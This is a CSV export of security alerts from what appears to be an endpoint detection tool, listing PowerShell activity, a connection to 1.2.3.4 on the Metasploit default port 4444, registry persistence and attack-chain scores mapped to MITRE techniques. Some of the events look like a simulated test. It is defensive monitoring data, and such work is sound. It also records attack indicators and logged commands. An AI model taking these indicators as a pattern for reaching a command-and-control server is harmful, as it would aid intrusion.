id,timestamp,event,severity,status,mitre_id,tactic,host,user,ip,country,vt_score,abuse_score,threat_risk,detail
ALT-51057711,2026-06-11 08:37:55,Process Ancestry Attack Detected,LOW,OPEN,T1189,Initial Access,nani123,katre,-,-,0,0,LOW,"Chrome -> CMD [Drive-by] | Parent  : C:\Program Files\Google\Chrome\Application\chrome.exe | Child   : C:\Windows\System32\cmd.exe | CMD     : C:\WINDOWS\system32\cmd.exe /d /s /c """"C:\Program Files\McAfee\WebAdvisor\BrowserHost.exe"" chrome-extension://fheoggkfdfchfphceeifdbepaooicaho/ --parent-window=0"" < \\.\pipe\chrome.nativeMessaging.in.944452a2f32412d3 > \\.\pipe\chrome.nativeMessaging.out.944452a2f32412d3"
ALT-60160695,2026-06-11 08:37:55,Process Ancestry Attack Detected,LOW,OPEN,T1189,Initial Access,nani123,katre,-,-,0,0,LOW,"Chrome -> CMD [Drive-by] | Parent  : C:\Program Files\Google\Chrome\Application\chrome.exe | Child   : C:\Windows\System32\cmd.exe | CMD     : C:\WINDOWS\system32\cmd.exe /d /s /c """"C:\Program Files\McAfee\WebAdvisor\BrowserHost.exe"" chrome-extension://fheoggkfdfchfphceeifdbepaooicaho/ --parent-window=0"" < \\.\pipe\chrome.nativeMessaging.in.944452a2f32412d3 > \\.\pipe\chrome.nativeMessaging.out.944452a2f32412d3"
ALT-37699933,2026-06-07 18:29:17,"⚡ Multi-Stage Attack Chain (8 events, score 202)",CRITICAL,OPEN,TA0001,Attack Chain,nani123,katre,-,-,0,0,CRITICAL,"Chain Score    : 202 | Events         : 8 in 300s window | Unique Tactics : 6 | Tactics Path   : Persistence → Defense Evasion → Command & Control → Execution → Impact | MITRE IDs      : T1027, T1105, T1059.001, T1490 | Attack Stages  : |   1. Suspicious PowerShell Detected |   2. Suspicious PowerShell Detected |   3. Suspicious PowerShell Detected |   4. Suspicious PowerShell Detected |   5. Process Ancestry Attack Detected |   6. Suspicious Network Connection Detected"
CHAIN-221788,2026-06-07 18:29:16,"⚡ Multi-Stage Attack Chain (8 events, score 202)",CRITICAL,OPEN,TA0001,Attack Chain,nani123,katre,-,-,0,0,CRITICAL,"Chain Score    : 202 | Events         : 8 in 300s window | Unique Tactics : 6 | Tactics Path   : Persistence → Defense Evasion → Command & Control → Execution → Impact | MITRE IDs      : T1027, T1105, T1059.001, T1490 | Attack Stages  : |   1. Suspicious PowerShell Detected |   2. Suspicious PowerShell Detected |   3. Suspicious PowerShell Detected |   4. Suspicious PowerShell Detected |   5. Process Ancestry Attack Detected |   6. Suspicious Network Connection Detected"
ALT-72034952,2026-06-07 18:29:16,Suspicious Network Connection Detected,HIGH,OPEN,T1059.001,Execution,nani123,katre,1.2.3.4,Australia,2,100,HIGH,Metasploit default C2 port | Process : powershell.exe | Dest    : 1.2.3.4:4444 | State   : SYN_SENT
ALT-58973910,2026-06-07 18:29:14,Suspicious Network Connection Detected,HIGH,OPEN,T1059.001,Execution,nani123,katre,1.2.3.4,Australia,2,100,CRITICAL,Metasploit default C2 port | Process : powershell.exe | Dest    : 1.2.3.4:4444 | State   : SYN_SENT
ALT-91467056,2026-06-07 18:28:55,"⚡ Multi-Stage Attack Chain (7 events, score 172)",CRITICAL,OPEN,TA0001,Attack Chain,nani123,katre,-,-,0,0,CRITICAL,"Chain Score    : 172 | Events         : 7 in 300s window | Unique Tactics : 6 | Tactics Path   : Persistence → Defense Evasion → Command & Control → Execution → Impact | MITRE IDs      : T1547.001, T1027, T1105, T1059.001, T1490 | Attack Stages  : |   1. Registry Persistence Detected |   2. Suspicious PowerShell Detected |   3. Suspicious PowerShell Detected |   4. Suspicious PowerShell Detected |   5. Suspicious PowerShell Detected |   6. Process Ancestry Attack Detected"
CHAIN-272435,2026-06-07 18:28:55,"⚡ Multi-Stage Attack Chain (7 events, score 172)",CRITICAL,OPEN,TA0001,Attack Chain,nani123,katre,-,-,0,0,CRITICAL,"Chain Score    : 172 | Events         : 7 in 300s window | Unique Tactics : 6 | Tactics Path   : Persistence → Defense Evasion → Command & Control → Execution → Impact | MITRE IDs      : T1547.001, T1027, T1105, T1059.001, T1490 | Attack Stages  : |   1. Registry Persistence Detected |   2. Suspicious PowerShell Detected |   3. Suspicious PowerShell Detected |   4. Suspicious PowerShell Detected |   5. Suspicious PowerShell Detected |   6. Process Ancestry Attack Detected"
ALT-30127003,2026-06-07 18:28:55,Process Ancestry Attack Detected,LOW,OPEN,T1059.001,Execution,nani123,katre,-,-,0,0,LOW,"PS -> CMD [PS->CMD chain] | Parent  : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Child   : C:\Windows\System32\cmd.exe | CMD     : ""C:\WINDOWS\system32\cmd.exe"" /c powershell -NoExit -Command whoami"
ALT-65078420,2026-06-07 18:28:55,Process Ancestry Attack Detected,LOW,OPEN,T1059.001,Execution,nani123,katre,-,-,0,0,LOW,"PS -> CMD [PS->CMD chain] | Parent  : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Child   : C:\Windows\System32\cmd.exe | CMD     : ""C:\WINDOWS\system32\cmd.exe"" /c powershell -NoExit -Command whoami"
ALT-67931630,2026-06-07 18:28:46,"⚡ Multi-Stage Attack Chain (6 events, score 154)",CRITICAL,OPEN,TA0001,Attack Chain,nani123,katre,-,-,0,0,CRITICAL,"Chain Score    : 154 | Events         : 6 in 300s window | Unique Tactics : 6 | Tactics Path   : Persistence → Defense Evasion → Command & Control → Execution → Impact | MITRE IDs      : T0000, T1547.001, T1027, T1105, T1059.001, T1490 | Attack Stages  : |   1. Suspicious EXE File Detected |   2. Registry Persistence Detected |   3. Suspicious PowerShell Detected |   4. Suspicious PowerShell Detected |   5. Suspicious PowerShell Detected |   6. Suspicious PowerShell Detected"
CHAIN-381785,2026-06-07 18:28:46,"⚡ Multi-Stage Attack Chain (6 events, score 154)",CRITICAL,OPEN,TA0001,Attack Chain,nani123,katre,-,-,0,0,CRITICAL,"Chain Score    : 154 | Events         : 6 in 300s window | Unique Tactics : 6 | Tactics Path   : Persistence → Defense Evasion → Command & Control → Execution → Impact | MITRE IDs      : T0000, T1547.001, T1027, T1105, T1059.001, T1490 | Attack Stages  : |   1. Suspicious EXE File Detected |   2. Registry Persistence Detected |   3. Suspicious PowerShell Detected |   4. Suspicious PowerShell Detected |   5. Suspicious PowerShell Detected |   6. Suspicious PowerShell Detected"
